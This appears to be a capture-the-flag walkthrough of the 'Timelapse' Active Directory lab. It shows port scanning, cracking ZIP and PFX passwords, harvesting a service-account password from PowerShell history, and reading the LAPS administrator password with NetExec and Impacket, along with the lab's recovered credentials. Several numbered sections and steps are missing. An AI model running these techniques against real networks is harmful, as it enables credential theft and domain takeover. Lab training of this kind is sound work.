Timelapse is a Windows Active Directory machine that teaches you how apparently harmless backup files can expose credentials and certificates. The attack progresses from anonymous SMB access to a domain account, then to a service account and finally Administrator.

## Attack path overview

### 01

SMB enumeration

Find an accessible backup share

### 02

Recover credentials

Crack a ZIP password and extract a PFX certificate

### 03

Initial access

Authenticate to WinRM as legacyy

### 04

Lateral movement

Discover svc_deploy credentials in PowerShell history

### 05

Privilege escalation

Read the Administrator LAPS password

## 1. Enumeration

### Step 1 — Scan all TCP ports

Start with a full TCP scan of your assigned target.

```
export TARGET_IP=<TARGET_IP>

sudo nmap -Pn -p- -T4 --min-rate 2000 "$TARGET_IP"
```

Then perform service detection on the discovered ports:

```
sudo nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5986 "$TARGET_IP"
```

## 2. Crack the ZIP and PFX passwords

### Step 4 — Crack `winrm_backup.zip`

Move into the directory where you downloaded the ZIP.

If your Kali wordlist is compressed, extract it first:

```
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Convert the ZIP into a format John the Ripper can crack:

```
zip2john winrm_backup.zip > winrm_backup.hash
```

Run John:

```
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
```

Display the recovered password:

```
john --show winrm_backup.hash
```

The expected password is:

```
supremelegacy
```

Extract the archive:

```
7z x winrm_backup.zip
```

Enter `supremelegacy` when prompted.

You should now have:

```
legacyy_dev_auth.pfx
```

### Step 5 — Crack the PFX password

A PFX file is a PKCS#12 container that can hold a certificate and its associated private key. Cracking the ZIP password only reveals the file; the PFX itself has a separate password.

Generate the PFX hash:

```
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
```

Run John:

```
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
```

Display the result:

```
john --show legacyy_dev_auth.hash
```

The expected PFX password is:

```
thuglegacy
```

The two password-recovery steps are distinct: `supremelegacy` unlocks the ZIP, while `thuglegacy` unlocks the PFX.

## 4. Lateral movement — `legacyy` to `svc_deploy`

### Step 8 — Search PowerShell command history

This is the key enumeration step in Timelapse.

PowerShell's PSReadLine module can save commands from previous interactive sessions to a history file. Check the current user's history:

```
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Alternatively, use the full path:

```
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The history contains commands resembling:

```
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

The recovered password on the standard Timelapse machine is:

```
E3R$Q62^12p7PLlC%KWaxuaV
```

Why this works: `ConvertTo-SecureString` converts the plaintext into a SecureString object at runtime, but it does not erase the original password from the saved command history.

This is a common operational security mistake: credentials embedded directly in commands can be exposed through shell history, logs, or monitoring systems.

## 5. Privilege escalation — LAPS to Administrator

### Step 10 — Understand LAPS

Local Administrator Password Solution (LAPS) manages local administrator passwords on Windows computers. Depending on the LAPS version and configuration, passwords can be stored in Active Directory attributes and retrieved by accounts authorized to read them.

The legacy LAPS attribute is:

```
ms-Mcs-AdmPwd
```

Timelapse contains a `LAPS_Readers` group with permission to read the relevant administrator password. The `svc_deploy` account can use that access to retrieve the password for the domain controller's local Administrator account.

![](https://www.google.com/s2/favicons?domain=https://ilias1988.me&sz=32)

Ilias1988+1

### Step 11 — Retrieve the LAPS password

From Kali, use NetExec to authenticate to LDAP and query LAPS information:

```
nxc ldap "$TARGET_IP" \
  -d timelapse.htb \
  -u svc_deploy \
  -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
  -M laps
```

Inspect the output for the computer object `DC01` and its associated administrator password.

If the module does not return the expected result, check the account's group membership and whether the LAPS password attribute is readable. A group name alone does not guarantee access to every computer's password.

An alternative on compatible Impacket installations is:

```
impacket-GetLAPSPassword \
  -dc-ip "$TARGET_IP" \
  'timelapse.htb/svc_deploy:<PASSWORD>'
```

Replace `<PASSWORD>` with the recovered service-account password. Use the tool's help output if the installed Impacket version expects different arguments.

The output should identify the relevant computer account and its LAPS password. This password is generated and can change, so retrieve it from your active instance rather than copying a value from a write-up.

## 8. Lessons learned

- SMB: Always check guest and anonymous access, not just authenticated shares.
    
- Password cracking: ZIP and PFX containers can each have independent passwords.
    
- Certificates: A private key and client certificate can provide authentication without a conventional password.
    
- PowerShell history: Search saved command history and transcripts for exposed credentials.
    
- Active Directory: Understand group membership and delegated permissions, not just usernames.
    
- LAPS: Password-reading permissions can become a direct path to local administrator access.
    

The key difference between Resolute and Timelapse is the escalation technique: Resolute focuses on abusing DNS administration privileges, while Timelapse chains certificate-based authentication, saved credentials, and LAPS password access.
